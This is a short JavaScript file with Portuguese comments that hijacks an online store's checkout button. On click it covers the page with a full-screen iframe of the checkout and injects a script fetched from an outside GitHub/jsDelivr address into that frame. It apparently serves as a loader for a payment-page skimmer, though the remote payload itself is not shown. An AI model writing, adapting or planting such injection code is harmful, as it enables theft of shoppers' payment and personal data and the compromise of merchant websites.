(() => {
  // Verifica se já executou na página
  if (window.__iframe_checkout_injected__) {
    console.log("Script já executado nesta página. Ignorando.");
    return;
  }
  window.__iframe_checkout_injected__ = true;

  // Função que tenta encontrar o botão e executar a lógica
  const tryInject = () => {
    const checkoutBtn = document.querySelector("#CartDrawer-Checkout");

    if (!checkoutBtn) {
      console.log("Botão de finalizar pedido ainda não encontrado. Tentando novamente...");
      return; // continua tentando
    }

    console.log("Botão encontrado. Injetando evento...");

    // Remove o atributo form
    checkoutBtn.removeAttribute("form");

    // Verifica se já possui o listener usando uma flag interna
    if (checkoutBtn.__iframe_checkout_listener_added__) {
      console.log("Listener já adicionado ao botão. Ignorando.");
      clearInterval(intervalId); // para o setInterval pois já foi configurado
      return;
    }

    // Define o evento de clique
    checkoutBtn.addEventListener("click", () => {
      // Cria o iframe
      const iframe = document.createElement("iframe");
      iframe.src = "/checkout"; // nova URL sem token
      iframe.style.position = "fixed";
      iframe.style.top = "0";
      iframe.style.left = "0";
      iframe.style.width = "100%";
      iframe.style.height = "100%";
      iframe.style.zIndex = "999999"; // alta prioridade
      iframe.style.border = "none";

      // Adiciona ao body
      document.body.appendChild(iframe);

      // Quando carregar, injeta o script externo
      iframe.onload = () => {
        try {
          const script = iframe.contentDocument.createElement("script");
          script.src = "https://cdn.jsdelivr.net/gh/eufiqueitaotriste/1@main/sallve1.js";
          iframe.contentDocument.body.appendChild(script);
        } catch (e) {
          console.error("Erro ao injetar o script no iframe:", e);
        }
      };
    });

    // Marca que já foi adicionado
    checkoutBtn.__iframe_checkout_listener_added__ = true;

    console.log("Script de iframe checkout injetado com sucesso.");

    clearInterval(intervalId); // para o setInterval após configurar
  };

  // Executa a cada 100ms até encontrar
  const intervalId = setInterval(tryInject, 100);
})();

